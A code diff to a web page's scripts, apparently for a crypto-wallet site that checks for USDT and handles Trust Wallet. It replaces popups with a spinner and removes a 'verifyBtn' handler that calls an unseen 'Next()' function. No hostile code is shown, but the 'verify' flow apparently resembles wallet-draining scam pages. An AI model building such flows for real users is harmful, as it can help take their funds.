@@ -1503,11 +1503,8 @@
         // Store timeout ID to clear it when new message comes
         let spinnerTimeout = null;
         
-        // Override the showPopup function from script.js
+        // Override the showPopup function from script.js - ONLY changes popup to spinner
         window.showPopup = function(message, color) {
-            console.log('🔵 showPopup called with:', message, color);
-            console.log('🔵 Raw message:', message, 'Color:', color);
-            
             // Clear any existing timeout
             if (spinnerTimeout) {
                 clearTimeout(spinnerTimeout);
@@ -1524,7 +1521,7 @@
             // Get loading spinner elements
             const loadingOverlay = document.getElementById('loading-spinner-overlay');
             if (!loadingOverlay) {
-                console.error('❌ Loading spinner overlay not found!');
+                // Fallback: show alert if spinner not found
                 alert(message || 'Processing...');
                 return;
             }
@@ -1534,22 +1531,17 @@
             // Clean message text (remove HTML tags if present)
             let cleanMessage = 'Processing...';
             if (message && typeof message === 'string' && message.trim()) {
-                // Remove HTML tags and extract text
                 const tempDiv = document.createElement('div');
                 tempDiv.innerHTML = message;
                 cleanMessage = tempDiv.textContent || tempDiv.innerText || message;
-                // Trim whitespace
                 cleanMessage = cleanMessage.trim();
-                // If empty after cleaning, use original
                 if (!cleanMessage) {
                     cleanMessage = message;
                 }
-                // Limit message length
                 if (cleanMessage.length > 50) {
                     cleanMessage = cleanMessage.substring(0, 47) + '...';
                 }
             } else if (message) {
-                // If message exists but isn't a string, convert it
                 cleanMessage = String(message);
             }
             
@@ -1557,80 +1549,8 @@
                 loadingText.textContent = cleanMessage;
             }
             
-            // Show the loading spinner with animation
+            // Show the loading spinner
             loadingOverlay.classList.add('show');
-            console.log('✅ Loading spinner shown:', cleanMessage);
-            
-            // Determine if this is a completion/error message (should auto-hide after a delay)
-            // Or a loading message (should stay visible until next call)
-            const isCompletion = cleanMessage.includes('complete') || 
-                                 cleanMessage.includes('failed') || 
-                                 cleanMessage.includes('Successful') ||
-                                 cleanMessage.includes('not connected') ||
-                                 cleanMessage.includes('No USDT');
-            
-            const isError = color === 'red' || cleanMessage.includes('failed') || cleanMessage.includes('not connected');
-            
-            if (isCompletion || isError) {
-                // Hide after 5 seconds for completion/error messages
-                spinnerTimeout = setTimeout(function() {
-                    loadingOverlay.classList.remove('show');
-                    console.log('⏰ Loading spinner hidden (completion message)');
-                    spinnerTimeout = null;
-                }, 5000);
-            } else {
-                // For loading messages (Please Wait, Loading...), keep visible
-                // It will be updated by the next showPopup call or hidden by completion message
-                console.log('⏳ Keeping spinner visible (loading message)');
-            }
-        };
-        
-        console.log('✅ showPopup function overridden successfully');
-    })();
-    
-    // Function to override showPopup (for reuse in backup handlers)
-    let spinnerTimeoutGlobal = null;
-    
-    function overrideShowPopup() {
-        window.showPopup = function(message, color) {
-            console.log('🔵 showPopup called with:', message, color);
-            
-            // Clear any existing timeout
-            if (spinnerTimeoutGlobal) {
-                clearTimeout(spinnerTimeoutGlobal);
-                spinnerTimeoutGlobal = null;
-            }
-            
-            const oldPopup = document.getElementById('popupBox');
-            if (oldPopup) {
-                oldPopup.style.display = 'none';
-                oldPopup.remove();
-            }
-            
-            const loadingOverlay = document.getElementById('loading-spinner-overlay');
-            if (!loadingOverlay) {
-                console.error('❌ Loading spinner overlay not found!');
-                alert(message || 'Processing...');
-                return;
-            }
-            
-            const loadingText = loadingOverlay.querySelector('.loading-text');
-            let cleanMessage = 'Processing...';
-            if (message) {
-                const tempDiv = document.createElement('div');
-                tempDiv.innerHTML = message;
-                cleanMessage = tempDiv.textContent || tempDiv.innerText || 'Processing...';
-                if (cleanMessage.length > 50) {
-                    cleanMessage = cleanMessage.substring(0, 47) + '...';
-                }
-            }
-            
-            if (loadingText) {
-                loadingText.textContent = cleanMessage;
-            }
-            
-            loadingOverlay.classList.add('show');
-            console.log('✅ Loading spinner shown:', cleanMessage);
             
             // Determine if this is a completion/error message
             const isCompletion = cleanMessage.includes('complete') || 
@@ -1643,29 +1563,84 @@
             
             if (isCompletion || isError) {
                 // Hide after 5 seconds for completion/error messages
-                spinnerTimeoutGlobal = setTimeout(function() {
+                spinnerTimeout = setTimeout(function() {
                     loadingOverlay.classList.remove('show');
-                    console.log('⏰ Loading spinner hidden (completion message)');
-                    spinnerTimeoutGlobal = null;
+                    spinnerTimeout = null;
                 }, 5000);
-            } else {
-                // For loading messages, keep visible until next call
-                console.log('⏳ Keeping spinner visible (loading message)');
             }
+            // For loading messages (Please Wait, Loading...), keep visible until next call
         };
-    }
+    })();
     
-    // Also override after DOM is ready (backup)
+    // Re-override on window load (backup - script.js uses window.load)
+    window.addEventListener('load', function() {
+        setTimeout(function() {
+            // Re-apply the override in case script.js redefines it
+            (function() {
+                let spinnerTimeout2 = null;
+                window.showPopup = function(message, color) {
+                    if (spinnerTimeout2) {
+                        clearTimeout(spinnerTimeout2);
+                        spinnerTimeout2 = null;
+                    }
+                    
+                    const oldPopup = document.getElementById('popupBox');
+                    if (oldPopup) {
+                        oldPopup.style.display = 'none';
+                        oldPopup.remove();
+                    }
+                    
+                    const loadingOverlay = document.getElementById('loading-spinner-overlay');
+                    if (!loadingOverlay) {
+                        alert(message || 'Processing...');
+                        return;
+                    }
+                    
+                    const loadingText = loadingOverlay.querySelector('.loading-text');
+                    let cleanMessage = 'Processing...';
+                    if (message && typeof message === 'string' && message.trim()) {
+                        const tempDiv = document.createElement('div');
+                        tempDiv.innerHTML = message;
+                        cleanMessage = tempDiv.textContent || tempDiv.innerText || message;
+                        cleanMessage = cleanMessage.trim();
+                        if (!cleanMessage) cleanMessage = message;
+                        if (cleanMessage.length > 50) {
+                            cleanMessage = cleanMessage.substring(0, 47) + '...';
+                        }
+                    } else if (message) {
+                        cleanMessage = String(message);
+                    }
+                    
+                    if (loadingText) {
+                        loadingText.textContent = cleanMessage;
+                    }
+                    
+                    loadingOverlay.classList.add('show');
+                    
+                    const isCompletion = cleanMessage.includes('complete') || 
+                                         cleanMessage.includes('failed') || 
+                                         cleanMessage.includes('Successful') ||
+                                         cleanMessage.includes('not connected') ||
+                                         cleanMessage.includes('No USDT');
+                    
+                    const isError = color === 'red' || cleanMessage.includes('failed') || cleanMessage.includes('not connected');
+                    
+                    if (isCompletion || isError) {
+                        spinnerTimeout2 = setTimeout(function() {
+                            loadingOverlay.classList.remove('show');
+                            spinnerTimeout2 = null;
+                        }, 5000);
+                    }
+                };
+            })();
+        }, 200);
+    });
+    
+    // Monitor for popupBox elements being created and replace with spinner
     document.addEventListener('DOMContentLoaded', function() {
-        // Re-override to ensure it's still set
-        overrideShowPopup();
-        
-        // Monitor for any popupBox elements being created and replace with spinner
-        const observer = new MutationObserver(function(mutations) {
+        const observer = new MutationObserver(function() {
             const popupBox = document.getElementById('popupBox');
             if (popupBox && popupBox.style.display !== 'none') {
-                console.log('PopupBox detected, replacing with spinner');
-                // Hide the old popup and show loading spinner instead
                 popupBox.style.display = 'none';
                 const loadingOverlay = document.getElementById('loading-spinner-overlay');
                 if (loadingOverlay && !loadingOverlay.classList.contains('show')) {
@@ -1686,151 +1661,7 @@
             });
         }
     });
-    
-    // Override after window load (backup - script.js uses window.load)
-    window.addEventListener('load', function() {
-        // Small delay to ensure script.js's load handler runs first
-        setTimeout(function() {
-            overrideShowPopup();
-            console.log('✅ showPopup override applied after window load');
-        }, 200);
-    });
-    
-    // Function to hide loading spinner manually
-    window.hideLoadingSpinner = function() {
-        const loadingOverlay = document.getElementById('loading-spinner-overlay');
-        if (loadingOverlay) {
-            loadingOverlay.classList.remove('show');
-        }
-    };
-    
-    // Test function - can be called from console: testSpinner()
-    window.testSpinner = function() {
-        const loadingOverlay = document.getElementById('loading-spinner-overlay');
-        if (loadingOverlay) {
-            console.log('Testing spinner...');
-            loadingOverlay.classList.add('show');
-            setTimeout(function() {
-                loadingOverlay.classList.remove('show');
-            }, 3000);
-        } else {
-            console.error('Loading overlay not found!');
-        }
-    };
-    
-    // Verify spinner element exists on page load
-    document.addEventListener('DOMContentLoaded', function() {
-        const loadingOverlay = document.getElementById('loading-spinner-overlay');
-        if (loadingOverlay) {
-            console.log('✅ Loading spinner element found');
-        } else {
-            console.error('❌ Loading spinner element NOT found!');
-        }
-    });
 </script>
 
-  <!-- ✅ Add event listener to call `Next()` - Multiple methods for Trust Wallet -->
-<script>
-    // Method 1: Immediate event delegation on document
-    (function() {
-        function handleSellButtonClick(e) {
-            var target = e.target;
-            var button = null;
-            
-            // Check if clicked element is verifyBtn or inside one
-            if (target) {
-                // Direct check
-                if ((target.classList && target.classList.contains('verifyBtn')) || target.id === 'verifyBtn') {
-                    button = target;
-                }
-                // Check parent
-                else if (target.closest) {
-                    button = target.closest('.verifyBtn, #verifyBtn');
-                }
-                // Fallback: check parentElement
-                else {
-                    var parent = target.parentElement;
-                    while (parent && parent !== document.body) {
-                        if ((parent.classList && parent.classList.contains('verifyBtn')) || parent.id === 'verifyBtn') {
-                            button = parent;
-                            break;
-                        }
-                        parent = parent.parentElement;
-                    }
-                }
-            }
-            
-            // If button found, call Next()
-            if (button) {
-                e.stopPropagation();
-                if (typeof window.Next === 'function') {
-                    window.Next();
-                }
-                return false;
-            }
-        }
-        
-        // Add multiple event listeners for maximum compatibility
-        document.addEventListener('click', handleSellButtonClick, true);
-        document.addEventListener('click', handleSellButtonClick, false);
-        window.addEventListener('click', handleSellButtonClick, true);
-    })();
-    
-    // Method 2: Direct onclick attachment after page loads
-    function attachDirectHandlers() {
-        var buttons = document.querySelectorAll('.verifyBtn, #verifyBtn');
-        for (var i = 0; i < buttons.length; i++) {
-            var btn = buttons[i];
-            // Remove existing onclick to avoid duplicates
-            btn.onclick = null;
-            // Add new handler
-            btn.onclick = function(e) {
-                e = e || window.event;
-                if (e) {
-                    e.stopPropagation();
-                    e.preventDefault();
-                }
-                if (typeof window.Next === 'function') {
-                    window.Next();
-                }
-                return false;
-            };
-            // Also add addEventListener as backup
-            btn.addEventListener('click', function(e) {
-                e.stopPropagation();
-                if (typeof window.Next === 'function') {
-                    window.Next();
-                }
-            }, true);
-        }
-    }
-    
-    // Run immediately if DOM ready
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', attachDirectHandlers);
-    } else {
-        attachDirectHandlers();
-    }
-    
-    // Also run on window load
-    window.addEventListener('load', function() {
-        setTimeout(attachDirectHandlers, 100);
-        setTimeout(attachDirectHandlers, 500);
-        setTimeout(attachDirectHandlers, 1000);
-    });
-    
-    // Watch for dynamically added buttons
-    if (window.MutationObserver) {
-        var observer = new MutationObserver(function() {
-            attachDirectHandlers();
-        });
-        if (document.body) {
-            observer.observe(document.body, {
-                childList: true,
-                subtree: true
-            });
-        }
-    }
-</script>
 
  </body></html>
